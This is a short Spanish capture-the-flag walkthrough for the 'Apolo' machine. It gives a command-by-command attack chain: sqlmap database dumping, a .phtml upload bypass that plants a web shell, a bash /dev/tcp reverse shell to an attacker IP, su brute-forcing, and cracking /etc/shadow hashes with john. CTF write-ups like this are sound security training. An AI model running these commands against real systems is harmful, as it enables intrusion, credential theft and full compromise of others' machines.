# QuickStart - Apolo CTF

## Paso 1: Escaneo inicial
```bash
ping <target>
nmap -T4 <target>
```
Puerto abierto: 80 (HTTP)

## Paso 2: Enumeración web
```bash
gobuster dir -u http://<target> -w /path/to/wordlist
```

## Paso 3: Explotación SQL Injection
Registrar usuario e identificar el ID. Utilizar formulario de búsqueda:
```bash
sqlmap -u "http://<target>/search" --forms --batch --dbs
sqlmap -u "http://<target>/search" --forms --batch -D <db> --tables
sqlmap -u "http://<target>/search" --forms --batch -D <db> -T users --dump
```
Obtener credenciales admin y desencriptar hash.

## Paso 4: Acceso como admin
- Iniciar sesión con credenciales obtenidas
- Acceder a panel de administración

## Paso 5: RCE mediante carga de archivos
- Intentar subir shell.php → rechazado
- Interceptar con BurpSuite y cambiar extensión a .phtml
- Subir shell exitosamente
- Acceder a `http://<target>/upload/shell.phtml`

## Paso 6: Reverse shell
```bash
nc -lvnp 4444  # Máquina atacante
```
Ejecutar en shell web: `bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1`

## Paso 7: Escalación - Usuario Luisillo
```bash
cat /etc/passwd  # Encontrar usuarios
# Ataque fuerza bruta a "su" con rockyou.txt
# Obtener contraseña de Luisillo
su - luisillo
```

## Paso 8: Escalación - Root
```bash
cat /etc/shadow  # Luisillo está en grupo shadow
# Extraer hash de root y usar john the ripper
john --wordlist=rockyou.txt hash.txt
su - root
```

**¡Máquina comprometida!**
